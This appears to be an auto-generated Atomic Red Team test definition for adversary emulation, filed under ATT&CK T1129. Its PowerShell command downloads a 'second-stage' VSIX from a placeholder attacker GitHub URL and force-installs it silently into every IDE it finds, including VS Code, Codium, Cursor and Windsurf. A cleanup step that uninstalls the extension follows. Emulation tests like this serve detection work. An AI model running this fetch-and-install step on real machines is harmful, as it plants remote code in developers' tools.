# Auto-generated by CIPHER v5.0
# Source: 70f63cfc6a82
attack_technique: T1129
display_name: "T1129 - Silent VSIX Installation Across All IDEs"
atomic_tests:
  - name: "T1129 - Silent VSIX Installation Across All IDEs"
    description: |
      Use the dropper binary to download and silently install a second‑stage VSIX into every detected IDE.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $url = "https://github.com/attacker/repo/releases/download/v1.0.0/floktokbok.autoimport.vsix"
        $tmp = "$env:TEMP\floktokbok.autoimport.vsix"
        Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing
        foreach ($cli in @('code','code-insiders','codium','cursor','windsurf')) {
          if (Get-Command $cli -ErrorAction SilentlyContinue) {
            & $cli --install-extension $tmp --force
          }
        }
      cleanup_command: |
        foreach ($cli in @('code','code-insiders','codium','cursor','windsurf')) {
          if (Get-Command $cli -ErrorAction SilentlyContinue) {
            & $cli --uninstall-extension floktokbok.autoimport
          }
        }
